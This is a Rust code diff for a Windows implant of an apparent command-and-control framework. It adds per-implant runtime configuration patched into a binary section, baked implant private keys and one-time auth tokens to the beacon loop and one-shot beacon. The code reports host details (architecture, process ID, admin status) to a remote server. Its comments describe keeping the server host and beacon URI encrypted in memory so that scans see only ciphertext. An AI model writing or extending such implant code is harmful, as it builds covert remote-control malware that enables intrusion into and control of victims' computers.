@@ -12,6 +12,7 @@
 #![cfg(target_os = "windows")]
 
 use crate::config::{self, Config};
+use crate::config_placeholder::{self, ImplantConfig};
 use crate::heap::{vec, String, Vec};
 use nyx_protocol::{
     encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
@@ -31,7 +32,15 @@ const BATCH_FLUSH: usize = 200 * 1024;
 
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
 pub unsafe fn beacon_loop() {
-    let (cfg, config_plain) = config::load();
+    // Try per-implant runtime config first (patched .nyx_cfg section).
+    // Falls back to compile-time config if the section is unpatched.
+    let (cfg, implant, config_plain) =
+        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
+            (c, i, p)
+        } else {
+            let (c, p) = config::load();
+            (c, ImplantConfig::default(), p)
+        };
     SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
 
     // Leak the decrypted config plaintext and register it with the memory
@@ -39,13 +48,18 @@ pub unsafe fn beacon_loop() {
     // sees ciphertext, not cleartext server_host/beacon_uri strings.
     crate::mem::register_owned(config_plain);
 
-    let kp = match ImplantKeypair::generate() {
-        Ok(k) => k,
-        Err(_) => {
-            // CSPRNG failure is fatal — proceeding would build a zero scalar →
-            // identity-point ECDH → a deterministic, decryptable session key.
-            crate::entry::diag_mark(b"ERR_KEYGEN_CSPRNG");
-            return;
+    // Per-implant keypair: if the server patched an implant private key, use it.
+    // Otherwise generate a fresh ephemeral keypair (compile-time / dev path).
+    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
+        // Use the per-implant baked keypair instead of generating a new one.
+        ImplantKeypair::from_secret_bytes(*priv_bytes)
+    } else {
+        match ImplantKeypair::generate() {
+            Ok(k) => k,
+            Err(_) => {
+                crate::entry::diag_mark(b"ERR_KEYGEN_CSPRNG");
+                return;
+            }
         }
     };
     let key = kp.session_key(&cfg.server_pub);
@@ -62,6 +76,7 @@ pub unsafe fn beacon_loop() {
         arch: crate::hostinfo::arch(),
         pid: crate::hostinfo::pid(),
         is_admin: crate::hostinfo::is_admin(),
+        auth_token: implant.auth_token, // per-implant one-time token (None for legacy)
     };
     let mut info_writer = Writer::new();
     info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
@@ -187,15 +202,26 @@ pub unsafe fn beacon_loop() {
 ///       its response POSTed back (full round-trip)
 ///   0xC0..0xCF = a specific step failed (see inline comments)
 pub unsafe fn beacon_oneshot() -> u32 {
-    let (cfg, config_plain) = config::load();
+    // Try per-implant config first, fall back to compile-time (dev path).
+    let (cfg, implant, config_plain) =
+        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
+            (c, i, p)
+        } else {
+            let (c, p) = config::load();
+            (c, ImplantConfig::default(), p)
+        };
     crate::mem::register_owned(config_plain);
     // DIAG step 1: config loaded OK
 
-    let kp = match ImplantKeypair::generate() {
-        Ok(k) => k,
-        Err(_) => {
-            crate::entry::diag_mark(b"ERR_ONESHOT_CSPRNG");
-            return 0xAF; // CSPRNG failure exit code
+    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
+        ImplantKeypair::from_secret_bytes(*priv_bytes)
+    } else {
+        match ImplantKeypair::generate() {
+            Ok(k) => k,
+            Err(_) => {
+                crate::entry::diag_mark(b"ERR_ONESHOT_CSPRNG");
+                return 0xAF; // CSPRNG failure exit code
+            }
         }
     };
     // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
@@ -212,6 +238,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         arch: crate::hostinfo::arch(),
         pid: crate::hostinfo::pid(),
         is_admin: crate::hostinfo::is_admin(),
+        auth_token: implant.auth_token,
     };
     let mut info_writer = Writer::new();
     info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
